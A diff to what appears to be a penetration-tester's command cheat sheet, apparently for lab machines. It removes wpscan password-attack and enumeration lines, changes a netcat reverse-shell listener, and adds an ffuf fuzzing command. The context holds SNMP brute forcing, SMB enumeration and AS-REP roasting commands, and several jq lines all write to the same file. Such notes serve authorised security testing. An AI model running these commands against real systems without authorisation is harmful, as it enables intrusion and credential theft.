@@ -74,9 +74,6 @@ onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.
 snmpwalk -c public -v 1 192.168.10.10
 snmpwalk -c public -v 2c 192.168.10.10
 cewl --depth 10 --with-numbers --write cewl.txt 192.168.10.10
-wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-version-detection passive --password-attack xmlrpc -U 'admin' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
-wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --plugins-detection aggressive
-wpscan --api-token APITOKEN --url "http://$TARGET/" --no-banner --enumerate u1-20
 nmblookup -A 192.168.10.10
 nmap --script 'smb-enum*' --script-args unsafe=1 -T5 192.168.10.10
 smbmap -H 192.168.10.10
@@ -90,7 +87,7 @@ smbclient.py "$DOMAIN"/user:astrongpassword@192.168.56.201
 nmap --script smb-enum-shares -p 139,445 -T4 -Pn 192.168.10.10
 amap -d 192.168.10.10 4455
 nikto -host 192.168.10.10
-rlwrap nc -lvnp 1337
+rlwrap nc -nvlp$PORT
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile users.txt -dc-ip "$DC_IP" "$DOMAIN"/
@@ -292,3 +289,4 @@ cat mailroom-ffuf.json| jq '.results[]|select(.status == '200')' | jq -c '{url:.
 cat mailroom-ffuf.json| jq '.results[]|select(.status == '403')' | jq -c '{url:.url,length:.length}' | sort -u -t, -k2 | awk -F '"' '{print $4}' > 200.txt
 cat mailroom-ffuf.json| jq '.results[]|select(.status == '404')' | jq -c '{url:.url,length:.length}' | sort -u -t, -k2 | awk -F '"' '{print $4}' > 200.txt
 cat mailroom-ffuf.json| jq '.results[]|select(.status == '500')' | jq -c '{url:.url,length:.length}' | sort -u -t, -k2 | awk -F '"' '{print $4}' > 200.txt
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u "http://$TARGET/FUZZ" --ext
